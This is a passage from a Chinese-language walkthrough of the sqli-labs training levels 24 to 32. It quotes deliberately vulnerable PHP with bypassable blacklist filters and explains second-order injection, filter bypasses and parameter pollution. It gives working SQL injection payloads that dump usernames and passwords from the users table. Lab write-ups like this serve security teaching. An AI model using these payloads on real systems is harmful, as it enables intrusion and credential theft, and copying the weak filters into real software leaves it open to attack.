operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be real smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是查询语句没什么好说的</p><h4 id="pass-change-php"><a href="#pass-change-php" class="headerlink" title="pass_change.php"></a>pass_change.php</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span>上传<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 都经过过滤</span><span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><span class="token comment">//下列字符受影响：\x00,\n,\r,\, ', ", \x1a</span><span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>两次密码相同<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 更新语句,</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You tried to be smart, Try harder!!!! :( '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 取得update影响的行数</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_affected_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的具体情况下，想要修改掉 admin 用户的密码的话，这里就需要使用的是二次注入的姿势了。</p><p>二次注入 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入</p><ol><li>通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。</li><li>服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li></ol><p>在创立用户的语句中</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>mysql_escape_string将我们的语句转义，譬如下面，我们可以很明显的看到’被转移为了&#39;这就使我们的语句不能执行。但是如果插入表中呢？这便是我们的注入点</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td>\</td><td>\</td></tr><tr><td>‘</td><td>&#39;</td></tr><tr><td>“</td><td>&quot;</td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php">转义前<span class="token punctuation">:</span><span class="token number">1</span>' <span class="token keyword">AND</span> <span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token number">1343</span> <span class="token function">FROM</span><span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">CONCAT</span><span class="token punctuation">(</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">IFNULL</span><span class="token punctuation">(</span><span class="token function">CAST</span><span class="token punctuation">(</span><span class="token function">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token constant">NCHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token function">FLOOR</span><span class="token punctuation">(</span><span class="token function">RAND</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token constant">FROM</span> <span class="token constant">INFORMATION_SCHEMA</span><span class="token operator">.</span><span class="token constant">PLUGINS</span> <span class="token constant">GROUP</span> <span class="token constant">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token operator">--</span> uwIe转义后<span class="token number">1</span>\' <span class="token keyword">AND</span> <span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token number">1343</span> <span class="token function">FROM</span><span class="token punctuation">(</span><span class="token constant">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">CONCAT</span><span class="token punctuation">(</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">IFNULL</span><span class="token punctuation">(</span><span class="token function">CAST</span><span class="token punctuation">(</span><span class="token function">CURRENT_USER</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">AS</span> <span class="token constant">NCHAR</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token function">FLOOR</span><span class="token punctuation">(</span><span class="token function">RAND</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token constant">FROM</span> <span class="token constant">INFORMATION_SCHEMA</span><span class="token operator">.</span><span class="token constant">PLUGINS</span> <span class="token constant">GROUP</span> <span class="token constant">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token operator">--</span> uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再看一下修改密码的sql语句</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>username通过单引号闭合这就是我们的注入点，我们完全可以控制修改用户的对象。</p><p>当用户为admin’# 时，我们的语句变为以下部分，成功注入</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='admin’# ' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><p>好，知道了思路，我们现在开始注入吧。</p><p>首先，我们注册一个用户名为<strong>admin’#violet</strong>的用户，你也许会想不是有过滤语句将‘转义吗？好，那我们看一下在数据库中的情况。</p><p><img src="Less-24.png"></p><p>我去，咋和别人不一样。我吐了啊。罢了罢了，理解意思就行了。如果知道原因的话，希望告诉我。</p><p>之后，因为我们的用户名含有注释，所以可以直接将admin的密码修改。</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><p>这一关，and以及or被过滤了。来，我们尝试绕过一下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">blacklist</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strip out OR (non case sensitive)</span><span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Strip out AND (non case sensitive)</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>本来一扫还想着大小写绕过，然后一看原来使用了正则表达式。那就没事了。</p><pre class="line-numbers language-regex" data-language="regex"><code class="language-regex"><span class="token group punctuation">(?i</span><span class="token group punctuation">)</span>即匹配时不区分大小写。表示匹配时不区分大小写。　　<span class="token group punctuation">(?s</span><span class="token group punctuation">)</span>即Singleline<span class="token group punctuation">(</span>单行模式<span class="token group punctuation">)</span>。表示更改<span class="token charclass class-name">.</span>的含义，使它与每一个字符匹配（包括换行 符<span class="token escape">\n</span>）。　　<span class="token group punctuation">(?m</span><span class="token group punctuation">)</span>即Multiline<span class="token group punctuation">(</span>多行模式<span class="token group punctuation">)</span> 。 表示更改<span class="token anchor function">^</span>和<span class="token anchor function">$</span>的 含义，使它们分别在任意一行的行首和行尾匹配，而不仅仅在整个字符串的开头和结尾匹配。<span class="token group punctuation">(</span>在此模式下,<span class="token anchor function">$</span>的 精确含意是:匹配<span class="token escape">\n</span>之前的位置以及字符串结束前的位置<span class="token charclass class-name">.</span><span class="token group punctuation">)</span> 　　<span class="token group punctuation">(?x</span><span class="token group punctuation">)</span>：表示如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。 　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>e<span class="token group punctuation">)</span>：表示本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。 　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>A<span class="token group punctuation">)</span>：表示如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说"/a/A"匹配"abcd"。 　　<span class="token group punctuation">(</span><span class="token quantifier number">?</span>E<span class="token group punctuation">)</span>：与"m"相反，表示如果使用这个修饰符，那么"<span class="token anchor function">$</span>"将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。 　　<span class="token group punctuation">(?U</span><span class="token group punctuation">)</span>：表示和问号的作用差不多，用于设置"贪婪模式"。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>在这里我们使用or或and，或者字符串中含有它们时可以双写。</p><p>造成这个漏洞的原因在于没有使用循环。仅仅过滤了一次</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">过滤前：oorr， anandd， oandr过滤后：<span class="token keyword">or</span>， <span class="token keyword">and</span>，<span class="token keyword">or</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="符号替换"><a href="#符号替换" class="headerlink" title="符号替换"></a>符号替换</h4><p>我们如果使用的是符合，完全可以用&amp; 或者|替换</p><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=$id</td></tr></tbody></table><p>拼接以及没有报错其他相同</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=$id</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">function blacklist($id)&#123;$id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id);&#x2F;&#x2F;strip out OR (non case sensitive)$id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out AND (non case sensitive)$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out --$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out #$id&#x3D; preg_replace(&#39;&#x2F;[\s]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out spaces$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\\\\]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out slashesreturn $id;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or与and可以用||或者&amp;&amp;代替，双写绕过。</p><p>过滤注释，可以通过闭合来进行代替。</p><p>空格可以通过下表进行代替</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>%09</td><td>TAB 键(水平)</td></tr><tr><td>%0a</td><td>新建一行</td></tr><tr><td>%0c</td><td>新的一页</td></tr><tr><td>%0d</td><td>return 功能</td></tr><tr><td>%0b</td><td>TAB 键(垂直)</td></tr><tr><td>%a0</td><td>空格</td></tr></tbody></table><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39;%0bUNION%0bSELECT%0b1,(SELECT%0bGROUP_CONCAT(username,passwoorrd%0bSEPARAToorr%0b0x3c62723e)%0bFROM%0busers),1%0banandd%0b&#39;1&#39;%0b&#x3D;%0b&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(‘$id’)</td></tr></tbody></table><p>仅仅时闭合方式不同。</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function blacklist($id)&#123;$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out --.$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out #.$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out spaces.# 严格匹配，防止多行注释，过滤select$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out spaces.$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out spaces.$id&#x3D; preg_replace(&#39;&#x2F;union&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out union$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out select# 过滤union$id&#x3D; preg_replace(&#39;&#x2F;UNION&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out UNION$id&#x3D; preg_replace(&#39;&#x2F;SELECT&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out SELECT$id&#x3D; preg_replace(&#39;&#x2F;Union&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out Union$id&#x3D; preg_replace(&#39;&#x2F;Select&#x2F;s&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out selectreturn $id;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">sElECT .....uNion .....空格上题的方法即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>方法有很多，这里不再赘述。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">-4235&#39;%0bUnIoN%0bALL%0bsElEct%0bNULL,(sElEct%0bGROUP_CONCAT(IFNULL(CAST(username%0bAS%0bNCHAR),0x20),0x7E,IFNULL(CAST(password%0bAS%0bNCHAR),0x20), 0x3c62723e)%0bFROM%0bsecurity.users%0bORDER%0bBY%0bid),NULL%0band%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=”$id”</td></tr></tbody></table><p>仅仅是闭合方式，以及没有报错。其他都相同。</p><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(‘$id’)</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function blacklist($id)&#123;$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;strip out &#x2F;*$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out --.$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);&#x2F;&#x2F;Strip out #.$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out spaces.$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out spaces.# 不区分大小写对union select进行过滤$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id);    &#x2F;&#x2F;Strip out UNION &amp; SELECT.return $id;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>union select 会被过滤, 但是 union%0bselect并不会, 其实与前几题没什么区别这里也不赘述了</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-4235&#39;)%0bUNION%0bALL%0bSELECT%0bNULL,(SELECT%0bGROUP_CONCAT(IFNULL(CAST(password%0bAS%0bNCHAR),0x20),0x7E,IFNULL(CAST(password%0bAS%0bNCHAR),0x20),0x3c62723e)%0bFROM%0bsecurity.users%0bORDER%0bBY%0bid),3%0band%0b(&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(‘$id’)</td></tr></tbody></table><p>还少了几个过滤，就不赘述了。</p><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP"># 获得请求的字符串,即你输入的语句$qs &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];$hint&#x3D;$qs;&#x2F;&#x2F; 模拟tomact JSP$id1&#x3D;java_implimentation($qs);&#x2F;&#x2F; apache的特性当相同参数有两个时接受后一个$id&#x3D;$_GET[&#39;id&#39;];&#x2F;&#x2F;echo $id1;whitelist($id1);$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;if($row)&#123;输出账号密码&#125;else&#123;报错&#125;function java_implimentation($query_string)&#123;$q_s &#x3D; $query_string;# 将字符串分割为数组$qs_array&#x3D; explode(&quot;&amp;&quot;,$q_s);# 对数组遍历foreach($qs_array as $key &#x3D;&gt; $value)&#123;# 取数组前两个字符,如果为id就返回$val&#x3D;substr($value,0,2);if($val&#x3D;&#x3D;&quot;id&quot;)&#123;$id_value&#x3D;substr($value,3,30); return $id_value;echo &quot;&lt;br&gt;&quot;;break;&#125;&#125;&#125;function whitelist($input)&#123;&#x2F;&#x2F; 正则表达式含义为匹配数字, 如果全部为数字无事发生, 否则执行hacked.php$match &#x3D; preg_match(&quot;&#x2F;^\d+$&#x2F;&quot;, $input);if($match)&#123;&#x2F;&#x2F;echo &quot;you are good&quot;;&#x2F;&#x2F;return $match;&#125;else&#123;header(&#39;Location: hacked.php&#39;);&#x2F;&#x2F;echo &quot;you are bad&quot;;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开始页面没什么特别的，关键是login.php。因为我们如果正常输入的话，是绝对会被java_implimentation()和whilist拦截，所以我们必须想办法绕过。</p><p>漏洞也就在java_implementation上，只要遇到id它便结束循环返回数组，也就说我们可以使用两个参数，第一个id=数字，使其绕过函数，第二个函数由于apache的特性，会被读取。这个方式叫做<strong>参数污染</strong>。</p><p>即用户输入这样的语句:</p><pre class="line-numbers language-none"><code class="language-none">index.php?id&#x3D;1&amp;id&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">login.php?id&#x3D;1&amp;id&#x3D;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=”$id”</td></tr></tbody></table><p>与Less29没有区别</p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(“$id”)</td></tr></tbody></table><p>与Less-32无本质区别</p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function check_addslashes($string)&#123;&#x2F;&#x2F; 将 \ 替换为 \\, 不太明白为什么时6个\\\\\\    $string &#x3D; preg_replace(&#39;&#x2F;&#39;. preg_quote(&#39;\\&#39;) .&#39;&#x2F;&#39;, &quot;\\\\\\&quot;, $string);          &#x2F;&#x2F;escape any backslash&#x2F;&#x2F; 将&#39;替换为\&#39;    $string &#x3D; preg_replace(&#39;&#x2F;\&#39;&#x2F;i&#39;, &#39;\\\&#39;&#39;, $string);                               &#x2F;&#x2F;escape single quote with a backslash&#x2F;&#x2F; 将&quot;替换为&#x2F;&quot; 